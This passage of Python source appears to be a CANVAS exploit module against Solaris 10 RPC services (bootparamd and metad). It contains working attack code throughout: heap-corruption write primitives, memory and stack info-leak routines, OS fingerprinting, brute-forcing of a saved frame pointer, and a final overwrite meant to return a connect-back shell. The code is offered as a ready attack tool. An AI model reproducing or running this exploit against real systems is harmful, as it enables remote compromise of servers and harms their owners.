        time.sleep(LEAK1_SLEEP_NORMAL)

        fds = []
        try:
            fd = socket.socket()
            fd.connect((self.host, self.port))
            payload = Packet(PKT_MAGIC_1,
                             program_number=self.endpoint['prognum'],
                             where=(self.p_recstream+8)-32,
                             what=address).get()
            fd.send(payload)
            time.sleep(0.1)

            for i in xrange(3+1):
                a = socket.socket()
                a.settimeout(20)
                a.connect((self.host, self.port))
                if i == 0:
                    time.sleep(0.4)
                fds.append(a)

            # free() my struct
            ret = fd.recv(512)
            fd.close()

        except Exception as e:
            # Most likely the port is closed.
            self.nbr_crashes+=1
            logging.debug("Current number of crashes: %d" % self.nbr_crashes)
            logging.debug("%s: %s" % (sys._getframe().f_code.co_name, str(e)))
            logging.debug("Waiting %ds..." % LEAK1_SLEEP_CRASH)
            time.sleep(LEAK1_SLEEP_CRASH)
            logging.debug("Resuming...")
            return None

        # Triggers the realfree()
        for i in xrange(len(fds)-1):
            fds[1+i].close()

        time.sleep(1)

        try:
            fds[0].send(payload_leaky)
            fds[0].setblocking(0)

            data = ''
            expected_amount=amount
            select.select([fds[0]],[],[])
            time.sleep(0.1)

            while len(data) != amount:

                try:
                    r = fds[0].recv(expected_amount)
                    logging.debug('received small chunk of %d bytes' % len(r))
                except socket.error as e:
                    err = e.args[0]
                    if err == errno.EAGAIN or err == errno.EWOULDBLOCK:
                        return None
                    else:
                        raise e

                if not r:
                    return None

                data += r
                expected_amount -= len(r)

            logging.debug('final chunk is of size %d bytes' % len(data))

            # To validate the check, we need to be sure that the
            # port is still open. If it is not then the process
            # crashed already and it is meaningless to even read
            # on the socket.

            b = socket.socket()
            b.connect((self.host, self.port))
            logging.debug("%s: payload returned is %s [%d bytes]" % (sys._getframe().f_code.co_name, 
                                                                     data.encode('hex')[:64], len(data)))

            if len(data) != 36: # TODO
                return data

            b.close()
            fds[0].close()
            return None

        except Exception as e:
            # Most likely the port is closed. Presumably because we tried to
            # on an unmmaped address!
            self.nbr_crashes+=1
            logging.debug("Current number of crashes: %d" % self.nbr_crashes)
            logging.debug("%s: %s" % (sys._getframe().f_code.co_name, str(e)))
            logging.debug("Anticrash countermeasure triggered: waiting 5s ....")
            time.sleep(LEAK1_SLEEP_CRASH)
            logging.debug("Resuming...")
            return None


    def __leak_data1_a(self, address, amount=1024):
        """
        Leak primitive #1
        We have partial control over what we can leak both in terms of size and source.
        Fortunately we can use it to leak the heap as much as we can _before_ our buffer.
        We use this to locate a RECSTREAM to create a new leak primitive.
        """

        payload_leaky = Packet(PKT_LEAKY,
                               xid=0x4c45414b,
                               program_number=self.endpoint['prognum']).get()

        for j in xrange(1):
            
            logging.debug("%s: attempt (%d/3): where=0x%.8x, what=0x%.8x" % (sys._getframe().f_code.co_name,
                                                                             j+1,
                                                                             self.p_recstream+8,
                                                                             address))
            self.reset_heap(5)

            logging.debug("%s: target port is now %d" % (sys._getframe().f_code.co_name, self.port))
            time.sleep(LEAK1_SLEEP_NORMAL)

            fds = []
            try:
                fd = socket.socket()
                fd.connect((self.host, self.port))
                payload = Packet(PKT_MAGIC_1,
                                 program_number=self.endpoint['prognum'],
                                 where=(self.p_recstream+8)-32,
                                 what=address).get()
                fd.send(payload)
                time.sleep(0.1)

                for i in xrange(3+1):
                    a = socket.socket()
                    a.settimeout(10)
                    a.connect((self.host, self.port))
                    if i == 0:
                        time.sleep(0.1)
                    fds.append(a)

                # free() my struct
                ret = fd.recv(512)
                fd.close()

            except Exception as e:
                # Most likely the port is closed.
                logging.debug("%s: %s" % (sys._getframe().f_code.co_name, str(e)))
                logging.debug("Waiting %ds..." % LEAK1_SLEEP_CRASH)
                time.sleep(LEAK1_SLEEP_CRASH)
                logging.debug("Resuming...")
                continue

            # Triggers the realfree()
            for i in xrange(len(fds)-1-1):
                fds[1+i].close()

            time.sleep(0.1)

            try:
                fds[0].send(payload_leaky)
                fds[0].setblocking(0)

                data = ''
                expected_amount=amount
                select.select([fds[0]],[],[])
                time.sleep(0.1)

                while len(data) != amount:

                    try:
                        r = fds[0].recv(expected_amount)
                        logging.debug('received small chunk of %d bytes' % len(r))
                    except socket.error as e:
                        err = e.args[0]
                        if err == errno.EAGAIN or err == errno.EWOULDBLOCK:
                            break
                        else:
                            raise e

                    if not r:
                        break

                    data += r
                    expected_amount -= len(r)

                logging.debug('final chunk is of size %d bytes' % len(data))

                # To validate the check, we need to be sure that the
                # port is still open. If it is not then the process
                # crashed already and it is meaningless to even read
                # on the socket.

                b = socket.socket()
                b.connect((self.host, self.port))
                logging.debug("%s: payload returned is %s [%d bytes]" % (sys._getframe().f_code.co_name,
                                                                         data.encode('hex')[:64], len(data)))

                if len(data) != 36: # TODO
                    return data

                b.close()
                fds[0].close()
                break

            except Exception as e:
                # Most likely the port is closed. Presumably because we tried to
                # on an unmmaped address!
                logging.debug("%s: %s" % (sys._getframe().f_code.co_name, str(e)))
                logging.debug("Anticrash countermeasure triggered: waiting 5s ....")
                time.sleep(LEAK1_SLEEP_CRASH)
                logging.debug("Resuming...")
                continue

        return None

    def __leak_data1(self, address, amount=1024, with_metad_leak=False):
        """
        Wrapper to select the correct method.
        The method depends on the process.
        """
        if with_metad_leak:
            return self.__leak_data1_b(address, amount=amount)
        else:
            return self.__leak_data1_a(address, amount=amount)

    def __leak_data2(self, address, amount=256, nbr_attempts=3):
        """
        Leak primitive #2
        Thanks to this primitive we can:
            - locate & leak the stack
            - leak the .got and any data part of any shared library or main binary
            - leak the heap
        This primitive is also allowing us to control the length to some degree therefore
        we can leak faster (although not _that_ fast due to the respawner prevention).
        """
        pkt_leaky = Packet(PKT_LEAKY,
                           xid=0x4c45414b,
                           program_number=self.endpoint['prognum'])
        pkt_leaky.build_host_with_fake_recstream(self.orig_recstream_obj, address, size=amount)
        payload_leaky = pkt_leaky.get()

        for j in xrange(nbr_attempts):

            logging.debug("%s: attempt (%d/3): where=0x%.8x, what=0x%.8x [address = %.8x]" % (sys._getframe().f_code.co_name,
                                                                                              j+1,
                                                                                              (self.p_xdr+12),
                                                                                              self.p_fake_recstream,
                                                                                              address))
            self.reset_heap(5)

            logging.debug("%s: target port is now %d" % (sys._getframe().f_code.co_name, self.port))
            time.sleep(LEAK2_SLEEP_NORMAL)

            fds = []
            try:
                fd = socket.socket()
                fd.connect((self.host, self.port))
                payload = Packet(PKT_MAGIC_2,
                                 program_number=self.endpoint['prognum'],
                                 where=(self.p_xdr+12)-32,
                                 what=self.p_fake_recstream).get()
                fd.send(payload)
                time.sleep(0.1)

                for i in xrange(3+1):
                    a = socket.socket()
                    a.connect((self.host, self.port))
                    a.settimeout(5)
                    if i == 0:
                        time.sleep(0.1)
                    fds.append(a)

                # FREE() my struct
                ret = fd.recv(1024)
                fd.close()

            except Exception as e:
                # Most likely the port is closed.
                # TODO.
                self.nbr_crashes+=1
                logging.debug("Current number of crashes: %d" % self.nbr_crashes)
                logging.debug("%s: %s" % (sys._getframe().f_code.co_name, str(e)))
                logging.debug("Waiting %ds..." % LEAK2_SLEEP_CRASH)
                time.sleep(LEAK2_SLEEP_CRASH)
                logging.debug("Resuming...")
                continue

            for i in xrange(len(fds)-1-1):
                fds[1+i].close()

            time.sleep(0.1)

            try:
                fds[0].send(payload_leaky)
                fds[0].settimeout(5)
                amount2 = amount + 32
                total = 0
                data = ''
                while 1:
                    ret2 = fds[0].recv(amount2+32)
                    if len(ret2) == 36 or len(ret2) == 0:
                        break
                    total += len(ret2)
                    data += ret2
                    logging.debug("Received %d bytes out of the %d expected [total=%d]" % (len(ret2), amount2, total))
                    if total == amount2:
                        logging.debug("%s: success", sys._getframe().f_code.co_name)
                        break
                    if total > amount2:
                        logging.error("%s: unexpected turn of even, retrying.", sys._getframe().f_code.co_name)
                        break

                # To validate the check, we need to be sure that the
                # port is still open. If it is not then the process
                # crashed already and it is meaningless to even read
                # on the socket.

                b = socket.socket()
                b.connect((self.host, self.port))
                logging.debug("%s: payload returned is %s [%d bytes]" % (sys._getframe().f_code.co_name,
                                                                         data.encode('hex')[:64],
                                                                         len(data)))
                # Never request 36 bytes!
                if total == amount2:
                    return data[:amount]
                b.close()
                fds[0].close()

            except socket.error as e:
                # Most likely the port is closed. Presumably because we tried to
                # on an unmmaped address!
                errorcode=e[0]
                if errorcode == errno.ECONNREFUSED:
                    logging.debug("%s: Connection Refused" % sys._getframe().f_code.co_name)
                    time.sleep(1)
                    continue

            except Exception as e:
                self.nbr_crashes+=1
                logging.debug("Current number of crashes: %d" % self.nbr_crashes)
                logging.debug("%s: %s" % (sys._getframe().f_code.co_name, str(e)))
                logging.debug("Anticrash countermeasure triggered: waiting %ds ...." % LEAK2_SLEEP_CRASH)
                time.sleep(LEAK2_SLEEP_CRASH)
                logging.debug("Resuming...")
                continue

        return None


    def __find_recstream_obj_fast(self, target_range):

            for address in target_range:
                self.p_recstream = address
                payload = self. __leak_data1(self.target_parameters['writable_address'], amount=PAGE_SIZE)
                if payload:
                    return address, payload
            return None

    def __find_recstream_object_fast(self):
        """
        Locate the RECSTREAM object associated with one of our cnx (fast)
        """

        # Range of the lucky guy
        # This should work irl but it is not a problem if some are missing
        # or even if they changed.

        L = [ x for x in bootparam_leak ]
        ultra_fast_range = sorted(set(L))[::-1]

        L = []
        for addr in ultra_fast_range:
            L += [ addr - 0x80 + i for i in xrange(0, 0x160, 16) ]
        med_fast_range = sorted(set(L))[::-1]

        slow_fast_range = xrange(min(ultra_fast_range)-0x200,
                                 max(ultra_fast_range)+0x200,
                                 16)

        logging.info("\t-> Trying the ultra-fast range")
        ret = self.__find_recstream_obj_fast(ultra_fast_range)
        if ret is not None:
            return ret

        logging.info("\t-> Trying the medium-fast range")
        ret = self.__find_recstream_obj_fast(med_fast_range)
        if ret is not None:
            return ret

        logging.info("\t-> Trying the slow-fast range")
        ret = self.__find_recstream_obj_fast(slow_fast_range)
        if ret is not None:
            return ret

    def find_recstream_object(self):
        """
        Locate the RECSTREAM object associated with one of our cnx.
        """
        return self.__find_recstream_object_fast()

    def validate_recstream_address(self, address):
        """
        We have corrupted an other field but only the correct one will give
        us a leak of 4096 bytes. Therefore we need to adapt our payload.
        """

        for i in xrange(3):
            logging.debug("p_recstream == %.8x?" % (address-8+8*i))
            self.p_recstream = address-8+8*i
            payload = self. __leak_data1(self.target_parameters['writable_address'], amount=PAGE_SIZE)
            if payload and len(payload) == PAGE_SIZE:
                return address-8+8*i
        return None

    def find_XDR_object(self):
        """
        This function looks for two things:
            a) The XDR object corresponding to our connexion
            b) The location where to put a fake RECSTREAM object
        """
        pattern_addr = struct.pack('<L', self.ptr_rectream)

        for x in xrange(1,20):

            if self.p_xdr and self.p_fake_recstream:
                break

            offset = x * LEAK_SIZE
            target_addr = self.ptr_rectream - offset
            logging.debug("Exploring range [0x%.8x,0x%.8x]" % (target_addr, target_addr+LEAK_SIZE-1))

            payload = self. __leak_data1(target_addr-SECURITY_OFFSET, amount=LEAK_SIZE+SECURITY_OFFSET)
            if payload:
                if not self.p_xdr:
                    idx = payload[SECURITY_OFFSET:].find(pattern_addr)
                    # The double check is most likely unnecessary but you never know.
                    # TODO: index bug to fix.
                    if idx != -1 and payload[SECURITY_OFFSET:][idx-20:idx-20+4] == 'KAEL':
                        self.p_xdr = (target_addr + idx - 12)
                        self.original_xdr = XDR(data=payload[SECURITY_OFFSET:][idx-12:idx+12])

                if not self.p_fake_recstream:
                    idx1 = payload[SECURITY_OFFSET:].find("W"*252)
                    if not idx1:
                       continue
                    self.p_fake_recstream = target_addr + idx1


    def find_ret2ld_payload(self):
        """
        Simple pattern matching.
        """

        address = self.p_recstream & 0xFFFFF000
        for page in range(address-0x10*PAGE_SIZE, address, PAGE_SIZE)[::-1]:
            logging.debug("Exploring range [0x%.8x,0x%.8x]" % (page, page+PAGE_SIZE-1))
            ret = self.__leak_data2(page, amount=4096)
            if not ret:
                logging.info("\t-> Skipping....")
            else:
                if 'V'*9 in ret:
                    logging.info("Found the payload!")
                    idx = ret.find(struct.pack('>L', 0xabcd0000))
                    if idx == -1:
                        ret = self.__leak_data2(page+PAGE_SIZE, amount=2048)
                        if not ret:
                            logging.info("\t-> Skipping....")
                            continue
                        idx = ret.find(struct.pack('>L', 0xabcd0000))
                        if idx == -1:
                            continue
                    self.ret2addr = page+idx
                    return

    def locate_the_stack(self):
        """
        It is easy to locate the stack as it is the first page allocated
        right before the CODE segment of the binary which is always mapped at 0x08050000
        Practically speaking the top of the stack should be below 0x08049000.
        """

        for page in range(MAX_TOP_STACK_ADDRESS-4*PAGE_SIZE,
                           MAX_TOP_STACK_ADDRESS+PAGE_SIZE, 

                           PAGE_SIZE)[::-1]:
            logging.info("\t-> Trying to read at 0x%.8x" % page)
            ret = self.__leak_data2(page, amount=256)
            if not ret:
                logging.info("\t-> Page not mmaped")
            else:
                logging.info("Found the top of the stack at 0x%.8x", page + PAGE_SIZE -1)
                self.stack_address = page
                return

    def leak_the_stack(self):
        """
        Infoleaking the stack is super important as there is a huge amount of information to leak.
        At this point we could even bypass a full ASLR.
        """

        stack_fragments = []
        addresses = []
        addresses.append([self.stack_address-PAGE_SIZE, 2048])
        addresses.append([self.stack_address-2048, 2048])
        addresses.append([self.stack_address, 2048])
        addresses.append([self.stack_address+2048, 1024])
        addresses.append([self.stack_address+2048+1024, 512])
        addresses.append([self.stack_address+2048+1024+512, 128])
        addresses.append([self.stack_address+2048+1024+512+128, 128])
        addresses.append([self.stack_address+2048+1024+512+128+128, 32])
        addresses.append([self.stack_address+2048+1024+512+128+128+32, 32])
        addresses.append([self.stack_address+2048+1024+512+128+128+32+32, 32])
        addresses.append([self.stack_address+2048+1024+512+128+128+32+32+32, 32])

        amount_leaked = 0
        for addr,size in addresses:

            logging.info("\t-> Trying to leak [0x%.8x, 0x%.8x]" % (addr, addr+size-1))
            success = 0
            for i in xrange(3):
                leaked_data = self.__leak_data2(addr, amount=size, nbr_attempts=2)
                if not leaked_data:
                    logging.error("Failed to leak %d bytes of stack at 0x%.8x, sleeping 10s." % (size, addr))
                    time.sleep(10)
                    continue
                success = 1
                amount_leaked += size
                break

            if not success:
                # We will deal with whatever we have...
                # Note: This is unlikely to work this way so you will probably
                # have to run again the exploit.
                leaked_data = "\x00" * size
                break

            logging.info("\t-> OK we could leak %d bytes at %.8x" % (size, addr))
            stack_fragments.append(leaked_data[:size])
            time.sleep(0.5)

        # In the end we need a big buffer
        self.stack_pages = ''.join(stack_fragments)


    def analyze_stack(self):
        """
        Extract sensitive information out of the stack.
        """

        L = [ self.stack_pages[4*i:4*i+4] for i in xrange(len(self.stack_pages)/4) ]

        if self.debug:
            for i in xrange(900):
                logging.debug("0x%.8x: %.8x" % (self.stack_address - PAGE_SIZE + i*4,
                                                struct.unpack('<L', L[i])[0]))

        # First let's easily extract AT_SUN_LDDATA and AT_BASE
        # This is super important as it leaks us where to copy our shellcode
        # before executing it:
        # 08047edc: 000007e0 # AT_SUN_LDDATA: 0x7e0 = 2016
        # 08047ee0: d0ffb000 # RWX page
        # 08047ee4: 00000007 # AT_BASE: LD.so CODE SEGMENT
        # 08047ee8: d0fca000 # R-X page
        # Note: The extraction starts from the end as it's highly unlikely to find the 0x7e0 pattern in the env.

        for i in xrange(len(L)):
            # For a bootparamd, it is always: 0xd0ffb000 with a 32 bits kernel.
            if struct.unpack('<L', L[::-1][i])[0] == 0x7e0:
                stack_addr_AT_SUN_LDDATA = self.stack_address - PAGE_SIZE + len(L)*4 - i*4
                index_AT_SUN_LDDATA = L[len(L)-i]
                self.ld_data_addr = struct.unpack('<L', index_AT_SUN_LDDATA)[0]

        # One important thing to understand is that the stack leak is
        # _not_ supposed to give a precise image of what would be the stack
        # when a function returns with a corrupted ebp.
        # There is one saved frame pointer that should be the same though.
        # We are crushing this one by default, if for some reason it does not
        # work, we are going to bf slightly the location of a saved frame pointer.
        # On average it takes like 10 attempts and of course many of them will do
        # the job.

        for i in xrange(len(L)):
            # The binary is the same on all the solaris versions.
            # There would be a lot of ways to locate this saved fp though.
            if struct.unpack('<L', L[i])[0] == self.p_xdr and struct.unpack('<L', L[i+1])[0] == 1:
                self.saved_ebp = self.stack_address - PAGE_SIZE + (i-1)*4


    ###
    # Write primitive(s)
    ###


    def __overwrite_ebp(self, where, what, amount=1024, timer=0.1, without_heap_reset=False):

        pkt1 = Packet(PKT_LEAKY,
                      xid=0x4c45414b,
                      program_number=self.endpoint['prognum'])
        pkt1.set_parameters(self.build_ret2ld_payload())
        payload_leaky = pkt1.get()

        pkt2 = Packet(PKT_MAGIC_1,
                      program_number=self.endpoint['prognum'],
                      where=where-32,
                      what=what)
        pkt2.set_parameters(self.build_ret2ld_payload())
        payload_write4 = pkt2.get()

        # Resetting the heap is mandatory.
        if not without_heap_reset:
            self.reset_heap(5)
            if timer > 1.0:
                logging.info('Waiting %.2f sec' % timer)
            else:
                logging.debug('Waiting %.2f sec' % timer)
            time.sleep(timer)

        fds = []
        try:
            fd = socket.socket()
            fd.connect((self.host, self.port))
            ret = fd.send(payload_write4)
            time.sleep(0.1)

            for i in xrange(4):
                a = socket.socket()
                a.connect((self.host, self.port))
                fds.append(a)

            # free() is called.
            fd.close()
        except Exception as e:
            logging.debug("Problem detected: %s" % str(e))

        for i in xrange(len(fds)):
            fds[i].close()

        # Let's wait for the connect back.
        time.sleep(1)
        if self.ISucceeded():
            logging.info('Got a shell!')
            return 1

        return 0

    ###
    # The main functions
    ###

    def do_infoleak(self):

        try:
            self.setProgress(20)
            logging.info("Trying to find the \"leaky\"'s RECSTREAM object")
            ret  = self.find_recstream_object()
            if not ret:
                logging.error("Info leaking the target failed, retry at least once the exploit. (1)")
                return 0

            p_rectream1, p = ret
            self.setProgress(30)
            if len(p) != PAGE_SIZE:
                logging.info("Adjusting p_recstream")
                self.ptr_rectream = self.validate_recstream_address(p_rectream1)
            else:
                self.ptr_rectream = p_rectream1
            if not self.ptr_rectream:
                logging.error("Info leak process failed, retry at least once the exploit. (2)")
                return 0

            self.setProgress(40)
            logging.info("RECSTREAM object is at: 0x%.8x" % self.ptr_rectream)
            payload = self. __leak_data1(self.ptr_rectream-SECURITY_OFFSET, amount=LEAK_SIZE+SECURITY_OFFSET)
            self.orig_recstream_obj = RECSTREAM(data=payload[SECURITY_OFFSET:])
            self.display_recstream(self.orig_recstream_obj)

            self.setProgress(50)
            logging.info("Trying to find the associated 'XDR' object and the place to store a fake RECSTREAM")
            self.find_XDR_object()
            if not self.p_xdr or not self.p_fake_recstream:
                logging.error("Info leak process failed, retry at least once the exploit. (3)")
                return 0
            logging.info("\t-> Found the XDR object at 0x%.8x:", self.p_xdr)
            self.display_xdr(self.original_xdr)
            logging.info("\t-> Found the perfect place to store our fake RECSTREAM: 0x%.8x" % self.p_fake_recstream)
            logging.info("libnsl is loaded at 0x%.8x" % (self.original_xdr['x_ops'] & 0xffff0000))

            self.setProgress(60)
            logging.info("Trying to find the ret2ld payload")
            self.find_ret2ld_payload()
            if not self.ret2addr:
                logging.error("Info leak process failed, retry at least once the exploit. (4)")
                return 0
            logging.info("\t-> Found ret2addr payload at 0x%.8x", self.ret2addr)

            # At this point we have:
            #   a) The original RECSTREAM structure content
            #   b) Its former location (does not matter anymore)
            #   c) The location where the fake RECSTREAM will be stored
            #   d) The location of the XDR

            # Now let's find the stack.
            self.setProgress(70)

            logging.info("Trying to find the STACK")
            self.locate_the_stack()
            if not self.stack_address:
                logging.error("Info leak process failed, retry at least once the exploit. (5)")
                return 0

            # At this point we have the stack so now we need to leak it and identify the stack frames
            # To do so, we will leak 2 pages. However due to the way the leak primitive works (and because we can't be fast)
            # we use an optimized strategy to make the least possible amount of calls.
            # Hopefully this is enough to get enough :>

            self.setProgress(80)
            self.leak_the_stack()
            if not self.stack_pages:
                logging.error("Info leak process failed, retry at least once the exploit. (6)")
                return 0

            logging.info("Analyzing the stack [0x%.8x, 0x%.8x]" % (self.stack_address-PAGE_SIZE,
                                                                   self.stack_address-PAGE_SIZE + len(self.stack_pages) -1))
            self.setProgress(85)
            self.analyze_stack()
            if not self.ld_data_addr or not self.saved_ebp:
                logging.error("Info leak process failed, retry at least once the exploit. (7)")
                return 0

            logging.info("\t-> Found LD_DATA at 0x%.8x", self.ld_data_addr)
            logging.info("\t-> Found our target FP copy at 0x%.8x", self.saved_ebp)
            return 1

        except Exception as e:
            logging.error('Unexpected failure: %s' % str(e))
            return 0


    def pwn(self, target=None, without_heap_reset=False):

            # A target has been chosen
            if target:
                self.ret2addr = target['ret2addr']
                self.ld_data_addr = target['ld_data_addr']
                self.saved_ebp = target['saved_ebp']
                return self.__overwrite_ebp(self.saved_ebp, self.ret2addr, timer=2, without_heap_reset=without_heap_reset)

            # Targetless attack. Slight bf (if even required) of saved_ebp is possible.
            logging.info("Trying first with saved_ebp = %.8x" % self.saved_ebp)
            ret = self.__overwrite_ebp(self.saved_ebp, self.ret2addr)
            if ret:
                return 1

            logging.info("OK it failed, no problem let's try the bruteforce mode")
            for i in xrange(60):
                logging.info("Hoping a saved_ebp will be at 0x%.8x" % (self.saved_ebp + i*4))
                ret = self.__overwrite_ebp(self.saved_ebp + i*4, self.ret2addr)
                if ret:
                    return ret

            return 0

    def pwn_universal(self):
        """
        In this mode, we do not use targets at all but
        rather use intensively information leaks.
        This will work on u2 to u9.
        This do not work on u10 as it would get us banned
        because the target process would crash too often.
        """

        # OK let's do up to 3 infoleak attempts.
        # It should only fail if we were going too fast

        success = False
        for i in xrange(3):
            ret = self.do_infoleak()
            if ret:
                success = True
                break

        if not success:
            return 0

        logging.info("The infoleak is a success, let's try to get the shell now!")
        self.setProgress(90)

        return self.pwn()


    def get_rwx_sections_addresses(self):

        if self.leaked_offset:

            if self.target_parameters['arch'] == 'x86':
                # Note: It's completely empirical and sometimes due to many libs loaded,
                # the target library is higher than libnsl.
                a = (0xd << 28) | (self.leaked_offset << 20) | 0xfc000
                b = (0xd << 28) | ((self.leaked_offset+1) << 20) | 0xfc000
                return [ b, a ]
            else:
                a = (0xf << 28) | (self.leaked_offset << 20) | 0xfb000
                b = (0xf << 28) | ((self.leaked_offset+1) << 20) | 0xfb000
                return [ b, a ]

        else:
            if self.target_parameters['arch'] == 'x86':
                return [ 0xd0ffc000, 0xd1ffc000 ]
            else:
                return [ 0xfeffb000 ]

    def pwn_oneshot(self):
        """
        u10 is a tricky target because of the anti-crash.
        To skip it, we have no choice but to hardcode addresses.
        Fortunately since we can perfectly control the heap post-crash, we can own
        the target in two packets.
        """

        potential_rwx_sections = self.get_rwx_sections_addresses()
        for rwx_candidate in potential_rwx_sections:
            logging.info("\t-> Testing %s target with rwx section at 0x%x" % (self.target_parameters['arch'], rwx_candidate))
            ret = self.pwn(target={'ret2addr': self.target_parameters['shellcode_location'],
                                   'ld_data_addr': rwx_candidate,
                                   'saved_ebp': self.target_parameters['saved_ebp']})
            if ret:
                return 1

        return 0


    def crash_for_debug(self):
        """
        Simple method used to quickly get new hardcoded uX targets.
        """

        return self.pwn(target={'ret2addr': 0xaaaaaaaa,
                                'ld_data_addr': 0xd1ffc000,
                                'saved_ebp': 0xeeeeeeee},
                                without_heap_reset=False)

    def is_service_started(self, prognum):
        """
        Simple function to detect if bootparam is available.
        """

        try:
            self.port = self.port_map(prog=prognum, vers=1)
            if not self.port:
                return 0
            else:
                return 1
        except Exception as e:
            logging.error('%s: unexpected failure: %s' % (sys._getframe().f_code.co_name, str(e)))
            return 0


    def method3(self):
        """
        This method is a bit brutal...
        We attempt to oneshot the process, without any intel of what it is...
        This is only performed if we get nothing
        """

        # OK
        for ep in endpoints:
            for uX in ep['targets']:
                for target_per_arch in ep['targets'][uX]:
                    if not self.is_service_started(ep['prognum']):
                        logging.info("Potential target not available: %s/%s/%s" % (ep['name'], uX, target_per_arch['arch']))
                        continue
                    logging.info("Oneshot attempt: %s [%s/%s]" % (ep['name'], uX, target_per_arch['arch']))
                    self.endpoint = ep
                    self.target_parameters = target_per_arch
                    ret = self.pwn_oneshot()
                    if ret:
                        return 1
        return 0


    def method2(self):

        # First is the service running?
        logging.info("Checking if metad is available")
        if not self.is_service_started(PROGNUM_METAD):
            logging.info('\t-> metad does not seem to be started/enabled')
            return 0
        logging.info("\t-> OK")

        # OK so at this point, we can start the fingerprint of the process
        logging.info("Trying to fingerprint the OS version")
        self.endpoint = metad_endpoint
        target_version_list = None
        target_arch = None
        for addr in metad_leak:
            self.p_recstream = addr
            payload = self. __leak_data1(self.p_recstream-SECURITY_OFFSET, amount=LEAK_SIZE+SECURITY_OFFSET)
            if not payload or len(payload) == 36:
                logging.info("\t-> Probably not %s" % ','.join(metad_leak[addr]))
                continue

            logging.debug("Leaked RECSTREAM object at: 0x%.8x!" % self.p_recstream)
            self.orig_recstream_obj = RECSTREAM(data=payload[SECURITY_OFFSET:])
            logging.debug("write_vc function leaked: 0x%.8x!" % self.orig_recstream_obj['writeit'])
            target_version_list = metad_leak[addr]
            target_arch =  "amd64" if (((self.orig_recstream_obj['writeit'] & (0xf << 28)) >> 28) == 0xf) else "x86"
            logging.info("\t-> Most likely discovered sol10_%s (%s)" % (','.join(target_version_list),target_arch))
            break

        if self.orig_recstream_obj:
            logging.info("Leaked offset: %.2x" % ((self.orig_recstream_obj['writeit'] >> 20)&0xff))
            self.leaked_offset = ((self.orig_recstream_obj['writeit'] >> 20)&0xff)

        # This could theoretically happen for u1 and u5
        if not target_arch:
            logging.info('Fingerprinting failed...\n')
            return 0

        # OK let's try our weapons
        nbr_attempts = 0
        for ep in endpoints:
            for uX in target_version_list:
                if uX in ep['targets']:
                    for target_per_arch in ep['targets'][uX]:
                        if target_per_arch['arch'] == target_arch:
                            if not self.is_service_started(ep['prognum']):
                                logging.info("Potential target not available: %s/%s/%s" % (ep['name'], uX, target_per_arch['arch']))
                                continue
                            logging.info("OK found a potential oneshot: %s [%s/%s]" % (ep['name'], uX, target_arch))
                            nbr_attempts += 1
                            self.endpoint = ep
                            self.target_parameters = target_per_arch
                            ret = self.pwn_oneshot()
                            if ret:
                                return 1

        if not nbr_attempts:
            logging.warning("Could not find any oneshot target...")

        return 0

    def method1(self):

        # First is the service running?
        logging.info("Checking if bootparam is available")
        if not self.is_service_started(PROGNUM_BOOTPARAM):
            logging.info('\t-> bootparam does not seem to be started/enabled')
            return 0

        logging.info("\t-> OK")
        # OK so at this point, chances are quite high unfortunately that the OS is u10.
        # Since the generic method does not work, let's try to oneshot it.
        logging.info("Expecting an u10 version")
        self.endpoint = bootparam_endpoint
        for t in bootparam_endpoint['targets']['u10']:
            self.target_parameters = t
            ret = self.pwn_oneshot()
            if ret:
                return 1

        # If we reach this point then it means that bootparam/u10 did not work.
        # It is now time to test the generic leak based method against bootparam.
        logging.info("Starting the generic attack")
        return self.pwn_universal()


    def run(self):

        self.get_args()
        self.nbr_crashes = 0

        # Add more debugging if required
        if self.debug:
            logger = logging.getLogger()
            logger.setLevel(logging.DEBUG)

        # Attempt to see if we can definitely be sure that it is not a Solaris 10
        # If the autodetect fails, we act as if that feature did not exist.
        ret = self.exploitnodes("osdetect")
        if not ret:
            logging.warning("Autodetection failed: assuming the target is indeed running Solaris 10")
        else:
            os = ret[0]
            logging.info("OS detected: %s" % os)
            if not 'solaris' in str(os).lower() or not '10' in str(os):
                logging.error("Autodetection says it is not a Solaris 10 target")
                logging.info('%s attacking %s (failed)' % (self.name, self.host))
                logging.error('%s done (failed)' % (self.name))
                return 0

        self.setProgress(0)
        logging.info(">>> Method #1: Attempting to exploit bootparam")
        ret = self.method1()
        if ret:
            self.setProgress(100)
            logging.info('%s attacking %s:%d (succeeded!)' % (self.name, self.host, self.port))
            logging.info('%s done (Success!)' % (self.name))
            return 1

        self.setProgress(33)
        logging.info(">>> Method #2: Attempting to infoleak metad")
        ret = self.method2()
        if ret:
            self.setProgress(100)
            logging.info('%s attacking %s:%d (succeeded!)' % (self.name, self.host, self.port))
            logging.info('%s done (Success!)' % (self.name))
            return 1

        self.setProgress(66)
        logging.info(">>> Method #3: Attempting to exploit blindly targets")
        ret = self.method3()
        if ret:
            self.setProgress(100)
            logging.info('%s attacking %s:%d (succeeded!)' % (self.name, self.host, self.port))
            logging.info('%s done (Success!)' % (self.name))
            return 1

        logging.info('%s attacking %s (failed)' % (self.name, self.host))
        logging.error('%s done (failed)' % (self.name))
        return 0


if __name__ == '__main__':
    logging.info('Running CANVAS %s Exploit v%s' % (DESCRIPTION, VERSION))
    app = theexploit()
    try:
        ret = standard_callback_commandline(app)
    except KeyboardInterrupt:
        pass
    if ret not in [0,1,None] and hasattr(ret, 'interact'):
        ret.interact()
